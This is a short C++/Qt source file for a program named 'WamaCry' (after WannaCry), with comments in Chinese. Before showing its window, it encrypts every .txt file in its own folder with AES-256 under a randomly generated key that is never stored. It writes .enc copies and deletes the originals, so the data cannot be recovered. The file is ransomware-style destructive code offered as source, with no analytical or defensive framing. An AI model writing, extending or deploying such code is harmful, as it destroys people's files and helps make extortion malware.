#include "wamacry.h"
#include <QApplication>
#include <QDir>
#include <QFile>
#include <QTextStream>
#include <QCryptographicHash>
#include <QRandomGenerator>
#include <QByteArray>

// 假设你已经有 QAESEncryption 库
#include "qaesencryption.h"

void handleTxtFiles()
{
    QString appDir = QCoreApplication::applicationDirPath();
    QDir dir(appDir);
    QStringList txtFiles = dir.entryList(QStringList() << "*.txt", QDir::Files);

    foreach(QString filename, txtFiles)
    {
        QFile file(dir.absoluteFilePath(filename));
        if (file.open(QIODevice::ReadWrite | QIODevice::Text))
        {
            QTextStream stream(&file);
            QString content = stream.readAll();
            file.close();

            // 生成随机 AES 密钥
            QByteArray key = QCryptographicHash::hash(QByteArray::number(QRandomGenerator::global()->generate()), QCryptographicHash::Sha256);
            QByteArray iv = QCryptographicHash::hash(QByteArray::number(QRandomGenerator::global()->generate()), QCryptographicHash::Md5);

            // 使用 AES 加密内容
            QAESEncryption encryption(QAESEncryption::AES_256, QAESEncryption::CBC);
            QByteArray encrypted = encryption.encode(content.toUtf8(), key, iv);

            // 保存加密后的内容
            QString encryptedFilename = filename + ".enc";
            QFile encryptedFile(dir.absoluteFilePath(encryptedFilename));
            if (encryptedFile.open(QIODevice::WriteOnly))
            {
                encryptedFile.write(encrypted);
                encryptedFile.close();
            }

            // 删除原始文件
            file.remove();
        }
    }
}

int main(int argc, char *argv[])
{
    handleTxtFiles(); // 在程序启动之前处理 txt 文件

    QApplication a(argc, argv);
    WamaCry w;
    w.show();
    return a.exec();
}
